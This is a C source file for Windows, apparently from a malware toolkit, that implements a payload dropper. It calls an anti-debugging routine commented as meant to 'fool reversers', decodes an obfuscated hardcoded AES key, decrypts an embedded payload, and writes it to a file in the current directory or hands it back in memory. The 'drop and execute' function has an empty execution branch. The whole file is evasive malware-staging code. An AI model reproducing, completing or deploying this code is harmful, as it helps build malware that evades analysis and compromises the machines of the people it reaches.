#include "xPayloadManager.h"

#include <stdint.h>
#include <Windows.h>

#include "xLibMaliciousApi.h"
#include "xOsApi.h"

#include "xPayload.h"



bool xPayloadManagerDrop(const wchar_t* fileName)
{
	if (!fileName)
	{
		return false;
	}

	bool result = false;

	// Fool reversers
	X_LIB_MALICIOUS_CALL(xCrashIfDebugger)();

	uint8_t* key = NULL;

	uint32_t keySize = 0;

	// Convert obfuscated key string to buffer
	if (X_LIB_MALICIOUS_CALL(xConversionHexStringToByte)(X_OBFUSCATED_STRING_A("93d2d334513e6d80268da1da978c37af60c141a7289229d191f05c7db5b1392f"), &key, &keySize))
	{
		uint8_t* payload = NULL;

		uint32_t payloadSize = 0;

		// Deobfuscate payload
		if (X_LIB_MALICIOUS_CALL(xObfuscationDeobfuscateAes)(key, keySize, s_payload, sizeof(s_payload), &payload, &payloadSize, xObfuscationEntropyReduce))
		{
			wchar_t fileNameDrop[MAX_PATH + 1] = { 0 };

			DWORD length = X_KERNEL32_CALL(GetCurrentDirectory)(MAX_PATH + 1, fileNameDrop);

			if (length)
			{
				if (length + wcslen(fileName) + wcslen(L"\\") < MAX_PATH)
				{
					wcscat_s(fileNameDrop, L"\\");

					wcscat_s(fileNameDrop, fileName);

					HANDLE file = X_KERNEL32_CALL(CreateFile)(fileNameDrop, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

					if (file != INVALID_HANDLE_VALUE)
					{
						if (X_KERNEL32_CALL(WriteFile)(file, payload, payloadSize, NULL, NULL))
						{
							result = true;
						}

						X_KERNEL32_CALL(CloseHandle)(file);
					}
				}
			}

			X_LIB_MALICIOUS_CALL(xMemoryFree)(payload);
		}

		X_LIB_MALICIOUS_CALL(xMemoryFree)(key);
	}

	return result;
}

bool xPayloadManagerDropAndExecute(const wchar_t* fileName)
{
	if (!fileName)
	{
		return false;
	}

	bool result = xPayloadManagerDrop(fileName);

	if (result)
	{

	}

	return result;
}

bool xPayloadManagerGetPayload(uint8_t** payload, uint32_t* payloadSize)
{
	if (!payload || !payloadSize)
	{
		return false;
	}

	bool result = false;

	// Fool reversers
	X_LIB_MALICIOUS_CALL(xCrashIfDebugger)();

	uint8_t* key = NULL;

	uint32_t keySize = 0;

	// Convert obfuscated key string to buffer
	if (X_LIB_MALICIOUS_CALL(xConversionHexStringToByte)(X_OBFUSCATED_STRING_A("93d2d334513e6d80268da1da978c37af60c141a7289229d191f05c7db5b1392f"), &key, &keySize))
	{
		uint8_t* out = NULL;

		uint32_t outSize = 0;

		// Deobfuscate payload
		if (X_LIB_MALICIOUS_CALL(xObfuscationDeobfuscateAes)(key, keySize, s_payload, sizeof(s_payload), &out, &outSize, xObfuscationEntropyReduce))
		{
			*payload = out;

			*payloadSize = outSize;

			result = true;
		}

		X_LIB_MALICIOUS_CALL(xMemoryFree)(key);
	}

	return result;
}
